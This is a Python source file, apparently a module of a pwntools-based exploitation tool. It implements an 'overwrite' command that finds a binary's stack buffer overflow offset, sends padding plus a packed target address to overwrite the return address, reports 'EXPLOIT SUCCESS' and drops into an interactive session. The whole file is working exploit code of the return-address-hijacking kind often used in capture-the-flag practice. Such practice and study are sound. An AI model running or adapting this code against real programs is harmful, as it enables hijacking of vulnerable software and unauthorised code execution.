import argparse
import sys
import pathlib
import pwn
import os

from logger import Logger
from binary import Binary

pwn.context.log_level = 'error'


class Overwrite:
    command = 'overwrite'

    def __init__(self):
        parser = argparse.ArgumentParser(
            description='Overwrite a return address to access specific part of the binary'
        )

        parser.add_argument('-t', '--target', type=str, help='Function to reach may be function name or address')
        parser.add_argument('binary', nargs='?', type=pathlib.Path, help='Binary to exploit')

        sysargs = sys.argv[2:]
        if len(sysargs):
            args = parser.parse_args(sys.argv[2:])

            if not args.binary or not args.target:
                Logger.error(f'You have to specify a {Logger.custom("binary", color="red", style="bold")} and a {Logger.custom("target", color="red", style="bold")} to exploit\n')
                parser.print_help()
                sys.exit(1)

            self.binary = Binary(path=args.binary)
            self.target = args.target

            self.main()

        else:
            parser.print_help()

    def parse_target(self):
        address = 0

        if self.target[0:2] == '0x':
            address = int(self.target, 16)
        else:
            address = self.binary.ELF.symbols[self.target]

        Logger.success(f'Target address is {hex(address)}')
        return address

    def main(self):
        Logger.info('Starting exploitation\n')

        target_address = self.parse_target()

        overflow_offset = self.binary.get_overflow_offset()

        if overflow_offset == -1:
            Logger.error(f'No overflow offset found')
            sys.exit(1)

        Logger.success(f'Overflow offset found: {overflow_offset}')

        process = pwn.process(self.binary.path)
        os.remove(process.corefile.path)

        process.sendline(b'A'* overflow_offset + getattr(pwn, self.binary.packing)(target_address))

        Logger.success('\nEXPLOIT SUCCESS\n')

        process.interactive()
        sys.exit(0)
